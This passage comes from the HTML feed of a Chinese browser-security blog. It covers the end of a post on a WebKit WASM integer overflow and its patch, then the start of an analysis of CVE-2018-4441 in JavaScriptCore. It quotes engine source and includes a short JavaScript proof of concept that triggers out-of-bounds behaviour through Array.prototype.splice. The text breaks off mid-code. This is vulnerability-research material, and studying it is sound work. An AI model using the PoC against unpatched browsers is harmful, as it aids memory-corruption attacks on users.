class="hljs-type">unsigned</span> c, <span class="hljs-type">unsigned</span> total) &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d/%d\n&quot;</span>, c, total); &#125; );<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;dyld_shared_cache_extract_dylibs_progress() =&gt; %d\n&quot;</span>, result);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>4、进入文件所在目录进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -o dsc_extractor ./dsc_extractor.cpp dsc_iterator.cpp<br></code></pre></td></tr></table></figure></li><li><p>使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">usage</span><br>./dsc_extractor 缓存目录 提取的路径<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如：</span><br>./dsc_extractor /System/Library/dyld/dyld_shared_cache_x86_64 ~/Desktop/libraries/<br></code></pre></td></tr></table></figure></li></ul><h4 id="动态调"><a href="#动态调" class="headerlink" title="动态调"></a>动态调</h4><p>每个程序都会引入一些动态链接库，想要在程序的运行过程中调试动态链接库，可以在<code>lldb</code>中：</p><ul><li><p>查看基地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看动态链接库的基地址用法</span><br>img list -h name<br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如查看SoftwareUpdate的基地址</span><br>img list -h SoftwareUpdate<br></code></pre></td></tr></table></figure></li><li><p>反汇编</p><p>如果我们想要观察动态链接库中的某些函数，我们需要先知道其名字，然后得到其汇编地址，接着就是下断点；</p><p>我们可以从IDA中查看动态链接库的一些函数的名字，然后通过名字在Ildb中找到对应的汇编：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">反汇编函数的用法</span><br>dis -n 函数名字<br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如反汇编authorizeWithEmptyAuthorizationForRights:</span><br>dis -n authorizeWithEmptyAuthorizationForRights:<br></code></pre></td></tr></table></figure><p><img src="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20240914212419700.png" alt="IDA查看函数"></p><p><img src="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20240914212432443.png" alt="lldb反汇编"></p></li></ul><h3 id="Hopping-the-Fence"><a href="#Hopping-the-Fence" class="headerlink" title="Hopping the Fence"></a>Hopping the Fence</h3><p>这部分主要是针对内存，去跳过<code>stack guard</code>部分，这部分不可操作，如果不小心操作了就会crash</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">STACK GUARD   <span class="hljs-number">70000b255000</span>-<span class="hljs-number">70000b256000</span> [ 4K   ] ---/rwx stack guard <span class="hljs-keyword">for</span> thread <span class="hljs-number">1</span><br>Stack         <span class="hljs-number">70000b256000</span>-70000b2d8000 [ 520K ] rw-/rwx thread <span class="hljs-number">1</span><br>STACK GUARD   70000b2d8000-70000b2d9000 [ 4K   ] ---/rwx stack guard <span class="hljs-keyword">for</span> thread <span class="hljs-number">2</span><br>Stack         70000b2d9000-70000b35b000 [ 520K ] rw-/rwx thread <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>Patch如下：</p><p><a href="https://github.com/WebKit/WebKit/commit/13a6adc918a62eb5a3c97f40f12be1b8e3e572ae#diff-9e91ccb23a0732b29e37e3c0e7bf6ef0ea2b31048b20f031f36dd59b8066a228">numCalleeLocals, numParameters, and numVars should be unsigned · WebKit&#x2F;WebKit@13a6adc (github.com)</a></p><p>主要变化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// 原来的</span><br><span class="hljs-type">unsigned</span> m_stackSize &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">unsigned</span> m_maxStackSize &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-comment">// 后来的</span><br>Checked&lt;<span class="hljs-type">unsigned</span>&gt; m_stackSize &#123; <span class="hljs-number">0</span> &#125;;<br>Checked&lt;<span class="hljs-type">unsigned</span>&gt; m_maxStackSize &#123; <span class="hljs-number">0</span> &#125;;<br></code></pre></td></tr></table></figure><p>Checked是什么呢？</p><p>追踪到对应的文件中，看到Checked是一个模板类，对于整数类型当其发生溢出时会崩溃</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// 在Source/WTF/wtf/CheckedArithmetic.h中</span><br><br><span class="hljs-comment">/* Checked&lt;T&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This class provides a mechanism to perform overflow-safe integer arithmetic</span><br><span class="hljs-comment"> * without having to manually ensure that you have all the required bounds checks</span><br><span class="hljs-comment"> * directly in your code.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two modes of operation:</span><br><span class="hljs-comment"> *  - The default is Checked&lt;T, CrashOnOverflow&gt;, and crashes at the point</span><br><span class="hljs-comment"> *    and overflow has occurred.</span><br><span class="hljs-comment"> *  - The alternative is Checked&lt;T, RecordOverflow&gt;, which uses an additional</span><br><span class="hljs-comment"> *    byte of storage to track whether an overflow has occurred, subsequent</span><br><span class="hljs-comment"> *    unchecked operations will crash if an overflow has occured</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * It is possible to provide a custom overflow handler, in which case you need</span><br><span class="hljs-comment"> * to support these functions:</span><br><span class="hljs-comment"> *  - void overflowed();</span><br><span class="hljs-comment"> *    This function is called when an operation has produced an overflow.</span><br><span class="hljs-comment"> *  - bool hasOverflowed();</span><br><span class="hljs-comment"> *    This function must return true if overflowed() has been called on an</span><br><span class="hljs-comment"> *    instance and false if it has not.</span><br><span class="hljs-comment"> *  - void clearOverflow();</span><br><span class="hljs-comment"> *    Used to reset overflow tracking when a value is being overwritten with</span><br><span class="hljs-comment"> *    a new value.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Checked&lt;T&gt; works for all integer types, with the following caveats:</span><br><span class="hljs-comment"> *  - Mixing signedness of operands is only supported for types narrower than</span><br><span class="hljs-comment"> *    64bits.</span><br><span class="hljs-comment"> *  - It does have a performance impact, so tight loops may want to be careful</span><br><span class="hljs-comment"> *    when using it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">32 位、32 G、1 次点击… |RET2 Systems 博客 — 32 bits, 32 gigs, 1 click… | RET2 Systems Blog</a></p><p><a href="https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.0.1-macOS-11.0/Source/JavaScriptCore/wasm/">https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.0.1-macOS-11.0/Source/JavaScriptCore/wasm/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JSC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSC--OOB</title>
    <link href="/2023/04/06/JSC--OOB/"/>
    <url>/2023/04/06/JSC--OOB/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-4441"><a href="#CVE-2018-4441" class="headerlink" title="CVE-2018-4441"></a>CVE-2018-4441</h1><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><h3 id="JSCell"><a href="#JSCell" class="headerlink" title="JSCell"></a>JSCell</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-comment">//下面是JSCell构造函数，是利用structure来进行初始化其成员</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">JSCell::JSCell</span><span class="hljs-params">(VM&amp;, Structure* structure)</span></span><br><span class="hljs-function">    : m_structureID(structure-&gt;id())</span><br><span class="hljs-function">    , m_indexingTypeAndMisc(structure-&gt;indexingModeIncludingHistory())</span><br><span class="hljs-function">    , m_type(structure-&gt;typeInfo().type())</span><br><span class="hljs-function">    , m_flags(structure-&gt;typeInfo().inlineTypeFlags())</span><br><span class="hljs-function">    , m_cellState(CellState::DefinitelyWhite)</span><br><span class="hljs-function">&#123;</span><br>    <span class="hljs-built_in">ASSERT</span>(!<span class="hljs-built_in">isCompilationThread</span>());<br><br>    <span class="hljs-comment">// Note that in the constructor initializer list above, we are only using values</span><br>    <span class="hljs-comment">// inside structure but not necessarily the structure pointer itself. All these</span><br>    <span class="hljs-comment">// values are contained inside Structure::m_blob. Note also that this constructor</span><br>    <span class="hljs-comment">// is an inline function. Hence, the compiler may choose to pre-compute the address</span><br>    <span class="hljs-comment">// of structure-&gt;m_blob and discard the structure pointer itself. There&#x27;s a chance</span><br>    <span class="hljs-comment">// that the GC may run while allocating this cell. In the event that the structure</span><br>    <span class="hljs-comment">// is newly instantiated just before calling this constructor, there may not be any</span><br>    <span class="hljs-comment">// other references to it. As a result, the structure may get collected before this</span><br>    <span class="hljs-comment">// cell is even constructed. To avoid this possibility, we need to ensure that the</span><br>    <span class="hljs-comment">// structure pointer is still alive at this point.</span><br>    <span class="hljs-built_in">ensureStillAliveHere</span>(structure);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ArrayStorage"><a href="#ArrayStorage" class="headerlink" title="ArrayStorage"></a>ArrayStorage</h3><p>下面讲到这是数组存储值的地方，下面列出了其部分类函数和成员，可以看到它和butterfly息息相关</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// This struct holds the actual data values of an array. A JSArray object points to its contained ArrayStorage</span><br><span class="hljs-comment">// struct by pointing to m_vector. To access the contained ArrayStorage struct, use the getStorage() and </span><br><span class="hljs-comment">// setStorage() methods. It is important to note that there may be space before the ArrayStorage that </span><br><span class="hljs-comment">// is used to quick unshift / shift operation. The actual allocated pointer is available by using:</span><br><span class="hljs-comment">//     getStorage() - m_indexBias * sizeof(JSValue)</span><br><span class="hljs-comment">// All slots in ArrayStorage (slots from 0 to vectorLength) are expected to be initialized to a JSValue or,</span><br><span class="hljs-comment">// for hole slots, JSValue().</span><br>    <span class="hljs-function"><span class="hljs-type">static</span> ArrayStorage* <span class="hljs-title">from</span><span class="hljs-params">(Butterfly* butterfly)</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast_ptr</span>&lt;ArrayStorage*&gt;(butterfly); &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> ArrayStorage* <span class="hljs-title">from</span><span class="hljs-params">(IndexingHeader* indexingHeader)</span> </span>&#123; <span class="hljs-keyword">return</span> indexingHeader-&gt;<span class="hljs-built_in">arrayStorage</span>(); &#125;<br>    <span class="hljs-function">Butterfly* <span class="hljs-title">butterfly</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;Butterfly*&gt;(<span class="hljs-keyword">this</span>); &#125;<br><br>    WriteBarrier&lt;SparseArrayValueMap&gt; m_sparseMap;<br>    <span class="hljs-type">unsigned</span> m_indexBias;<br>    <span class="hljs-type">unsigned</span> m_numValuesInVector;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE(JSVALUE32_64)</span><br>    <span class="hljs-type">uintptr_t</span> m_padding;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    WriteBarrier&lt;Unknown&gt; m_vector[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p>Butterfly</p><p>下面是Butterfly的部分成员函数，也可以看到Butterfly和ArrayStorage相互转换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">T* <span class="hljs-title">indexingPayload</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast_ptr</span>&lt;T*&gt;(<span class="hljs-keyword">this</span>); &#125;<br><span class="hljs-function">ArrayStorage* <span class="hljs-title">arrayStorage</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">indexingPayload</span>&lt;ArrayStorage&gt;(); &#125;<br></code></pre></td></tr></table></figure><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><p>下面是JSObject的构造函数和其成员</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">JSObject::JSObject</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly)</span></span><br><span class="hljs-function">    : JSCell(vm, structure)</span><br><span class="hljs-function">    , m_butterfly(vm, this, butterfly)</span><br><span class="hljs-function">&#123;</span><br>&#125;<br><span class="hljs-comment">// 下面是其成员</span><br>    AuxiliaryBarrier&lt;Butterfly*&gt; m_butterfly;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> CPU(ADDRESS32)</span><br>    <span class="hljs-type">unsigned</span> m_32BitPadding;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">// 下面是JSNonFinalObject的构造函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">JSNonFinalObject</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly = <span class="hljs-literal">nullptr</span>)</span></span><br><span class="hljs-function">        : JSObject(vm, structure, butterfly)</span><br><span class="hljs-function">    &#123;</span><br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><p>下面是JSArray的构造函数和相关创建函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">JSArray</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly)</span></span><br><span class="hljs-function">    : JSNonFinalObject(vm, structure, butterfly)</span><br><span class="hljs-function">&#123;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> Butterfly* <span class="hljs-title">tryCreateArrayButterfly</span><span class="hljs-params">(VM&amp; vm, JSObject* intendedOwner, <span class="hljs-type">unsigned</span> initialLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    Butterfly* butterfly = Butterfly::<span class="hljs-built_in">tryCreate</span>(<br>        vm, intendedOwner, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">baseIndexingHeaderForArrayStorage</span>(initialLength),<br>        ArrayStorage::<span class="hljs-built_in">sizeFor</span>(BASE_ARRAY_STORAGE_VECTOR_LEN));<br>    <span class="hljs-keyword">if</span> (!butterfly)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    ArrayStorage* storage = butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>    storage-&gt;m_sparseMap.<span class="hljs-built_in">clear</span>();<br>    storage-&gt;m_indexBias = <span class="hljs-number">0</span>;<br>    storage-&gt;m_numValuesInVector = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> butterfly;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> JSArray* <span class="hljs-title">JSArray::tryCreate</span><span class="hljs-params">(VM&amp; vm, Structure* structure, <span class="hljs-type">unsigned</span> initialLength, <span class="hljs-type">unsigned</span> vectorLengthHint)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ASSERT</span>(vectorLengthHint &gt;= initialLength);<br>    <span class="hljs-type">unsigned</span> outOfLineStorage = structure-&gt;<span class="hljs-built_in">outOfLineCapacity</span>();<br><br>    Butterfly* butterfly;<br>    IndexingType indexingType = structure-&gt;<span class="hljs-built_in">indexingType</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">LIKELY</span>(!<span class="hljs-built_in">hasAnyArrayStorage</span>(indexingType))) &#123;<br>        <span class="hljs-built_in">ASSERT</span>(<br>            <span class="hljs-built_in">hasUndecided</span>(indexingType)<br>            || <span class="hljs-built_in">hasInt32</span>(indexingType)<br>            || <span class="hljs-built_in">hasDouble</span>(indexingType)<br>            || <span class="hljs-built_in">hasContiguous</span>(indexingType));<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(vectorLengthHint &gt; MAX_STORAGE_VECTOR_LENGTH))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br><br>        <span class="hljs-type">unsigned</span> vectorLength = Butterfly::<span class="hljs-built_in">optimalContiguousVectorLength</span>(structure, vectorLengthHint);<br>        <span class="hljs-type">void</span>* temp = vm.jsValueGigacageAuxiliarySpace.<span class="hljs-built_in">allocateNonVirtual</span>(<br>            vm,<br>            Butterfly::<span class="hljs-built_in">totalSize</span>(<span class="hljs-number">0</span>, outOfLineStorage, <span class="hljs-literal">true</span>, vectorLength * <span class="hljs-built_in">sizeof</span>(EncodedJSValue)),<br>            <span class="hljs-literal">nullptr</span>, AllocationFailureMode::ReturnNull);<br>        <span class="hljs-keyword">if</span> (!temp)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        butterfly = Butterfly::<span class="hljs-built_in">fromBase</span>(temp, <span class="hljs-number">0</span>, outOfLineStorage);<br>        butterfly-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength);<br>        butterfly-&gt;<span class="hljs-built_in">setPublicLength</span>(initialLength);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hasDouble</span>(indexingType))<br>            <span class="hljs-built_in">clearArray</span>(butterfly-&gt;<span class="hljs-built_in">contiguousDouble</span>().<span class="hljs-built_in">data</span>(), vectorLength);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">clearArray</span>(butterfly-&gt;<span class="hljs-built_in">contiguous</span>().<span class="hljs-built_in">data</span>(), vectorLength);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">ASSERT</span>(<br>            indexingType == ArrayWithSlowPutArrayStorage<br>            || indexingType == ArrayWithArrayStorage);<br>        butterfly = <span class="hljs-built_in">tryCreateArrayButterfly</span>(vm, <span class="hljs-literal">nullptr</span>, initialLength);<br>        <span class="hljs-keyword">if</span> (!butterfly)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; BASE_ARRAY_STORAGE_VECTOR_LEN; ++i)<br>            butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>()-&gt;m_vector[i].<span class="hljs-built_in">clear</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">createWithButterfly</span>(vm, <span class="hljs-literal">nullptr</span>, structure, butterfly);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>];<br><br>    arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span>;<br>    arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>);<br><br>    arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span>;<br>    arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0xfffffff0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-title function_">main</span>();<br></code></pre></td></tr></table></figure><h2 id="splice函数"><a href="#splice函数" class="headerlink" title="splice函数"></a>splice函数</h2><p>上面<code>JavaScript</code>中用到的<code>splice</code>函数在<code>JSC</code>中对应<code>arrayProtoFunSplice</code>函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">JSC_NATIVE_FUNCTION_WITHOUT_TRANSITION</span>(<span class="hljs-string">&quot;splice&quot;</span>, arrayProtoFuncSplice, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(PropertyAttribute::DontEnum), <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h2 id="arrayProtoFunSplice"><a href="#arrayProtoFunSplice" class="headerlink" title="arrayProtoFunSplice"></a>arrayProtoFunSplice</h2><p>下面第90行根据删除元素的数量和增加的数量相比来决定使用<code>shift</code>还是<code>unshift</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">JSC_DEFINE_HOST_FUNCTION</span>(arrayProtoFuncSplice, (JSGlobalObject* globalObject, CallFrame* callFrame))<br>&#123;<br>    <span class="hljs-comment">// 15.4.4.12</span><br><br>    VM&amp; vm = globalObject-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    JSObject* thisObj = callFrame-&gt;<span class="hljs-built_in">thisValue</span>().<span class="hljs-built_in">toThis</span>(globalObject, ECMAMode::<span class="hljs-built_in">strict</span>()).<span class="hljs-built_in">toObject</span>(globalObject);<br>    <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == !thisObj);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!thisObj))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>    <span class="hljs-type">uint64_t</span> length = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(<span class="hljs-built_in">toLength</span>(globalObject, thisObj));<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br><br>    <span class="hljs-keyword">if</span> (!callFrame-&gt;<span class="hljs-built_in">argumentCount</span>()) &#123;<br>        std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = <span 